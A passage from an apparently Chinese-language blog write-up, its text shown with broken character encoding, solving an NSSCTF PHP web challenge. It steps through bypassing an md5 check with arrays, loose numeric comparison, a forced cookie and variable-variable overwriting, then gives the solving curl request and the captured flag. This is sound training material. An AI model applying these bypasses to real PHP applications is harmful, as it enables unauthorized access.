class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class="line">    $b=$_POST[&#x27;ctf&#x27;];</span><br><span class="line">    $a=$_POST[&#x27;gdou&#x27;];</span><br><span class="line">    if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123;</span><br><span class="line">        if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123;</span><br><span class="line">           if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123;</span><br><span class="line">               if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123;</span><br><span class="line">                  $aaa=$_GET[&#x27;aaa&#x27;];</span><br><span class="line">                  $bbb=$_GET[&#x27;bbb&#x27;];</span><br><span class="line">                 if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;</span><br><span class="line">                   $give = &#x27;cancanwordflag&#x27;;</span><br><span class="line">                   $get =&#x27;hacker!&#x27;;</span><br><span class="line">                   if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">                         die($give);</span><br><span class="line">                    &#125;</span><br><span class="line">                   if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">                       die($get);</span><br><span class="line">                    &#125;</span><br><span class="line">                    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">                        $$key = $value;</span><br><span class="line">                   &#125;</span><br><span class="line">                    foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">                         $$key = $$value;</span><br><span class="line">                    &#125;</span><br><span class="line">                   echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                  echo &quot;æ´—æ´—ç¡å§&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;è¡Œä¸è¡Œå•Šç»†ç‹—&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">  echo &#x27;èœèœ&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &quot;å°±è¿™?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &quot;åˆ«æ¥æ²¾è¾¹&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">åˆ«æ¥æ²¾è¾¹</span><br></pre></td></tr></table></figure>
<p>æƒ³è¦è·å¾—flagï¼Œè¦è¿‡5å…³ã€‚</p>
<p>1.<code>if($_POST[&#39;gdou&#39;]!=$_POST[&#39;ctf&#39;] &amp;&amp; md5($a)===md5($b)){</code></p>
<p>md5ç¢°æ’ï¼Œå¼±æ¯”è¾ƒï¼Œåˆ©ç”¨æ•°ç»„md5è¿”å›ä¸ºnullï¼Œæ„é€ ä¸¤ä¸ªæ•°ç»„ã€‚</p>
<p>2.<code>if(isset($_COOKIE[&#39;cookie&#39;])){ if ($_COOKIE[&#39;cookie&#39;]==&#39;j0k3r&#39;){</code></p>
<p>å¼ºåˆ¶cookieï¼ŒCookie: cookie&#x3D;j0k3rã€‚</p>
<p>3.<code>if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb){</code></p>
<p>ä¾æ—§å¼±æ¯”è¾ƒï¼Œaaaä¸ç­‰äºbbbï¼Œæ ¹æ®å­—ç¬¦ä¸²åœ¨å¼±æ¯”è¾ƒæ—¶ä¼šè½¬åŒ–æˆæ•°å­—ï¼Œç›´æ¥æå®šã€‚</p>
<p>4.<code>if(isset($_GET[&#39;flag&#39;]) &amp;&amp; isset($_POST[&#39;flag&#39;])){     die($give);   } if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){     die($get); }</code><br>å¦‚æœpostæˆ–è€…getå‡ºç°flagï¼Œç›´æ¥dieæ‰ã€‚</p>
<p>5.<code>foreach ($_POST as $key =&gt; $value) {     $$key = $value; } foreach ($_GET as $key =&gt; $value) {     $$key = $$value; } echo $flag;</code></p>
<p>æƒ³è¦è·å¾—flagï¼Œå°±ä¸èƒ½è¦†ç›–flagçš„å˜é‡åï¼Œå³åœ¨æ•´ä¸ªpostå’Œgetçš„å†éè¿‡ç¨‹ä¸­å®Œå…¨ä¸è§¦flagã€‚</p>
<p><strong>æ‰€ä»¥æˆ‘ä»¬æœ€åçš„æŒ‡ä»¤å°±å®Œæˆäº†ã€‚</strong></p>
<p><strong>curl -X POST â€œ<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28925/?aaa=114514&bbb=114514a">http://node4.anna.nssctf.cn:28925/?aaa=114514&amp;bbb=114514a</a>â€œ  -H â€œCookie: cookie&#x3D;j0k3râ€ -d â€œgdou[]&#x3D;1&amp;ctf[]&#x3D;2â€</strong></p>
<p>æ‹¿åˆ°flagï¼Œ<strong>NSSCTF{2de514f9-94c3-4f50-b0fe-168893466643}</strong><br>è¿™é¢˜å…¶å®æœ€åä¸€æ­¥æœ‰ç‚¹æçš„ï¼Œæˆ‘ä¸€å¼€å§‹éƒ½æ²¡çœ‹æ‡‚æ˜¯å•¥ï¼Œè¦æ€ä¹ˆä¸å½±å“flagï¼Œä¹Ÿæ˜¯å¤§é“è‡³ç®€çš„æ‹¿åˆ°flagäº†ã€‚</p>
<hr>
<ol start="5">
<li></li>
</ol>
<hr>
<hr>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ç”±ç™½ç™½æ¯›æ¯›åˆ›ä½œï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>

        </div>
    </article>
</div>

</div>

<script src="/js/main.js?v=1767442695293"></script>
</body>
</html>
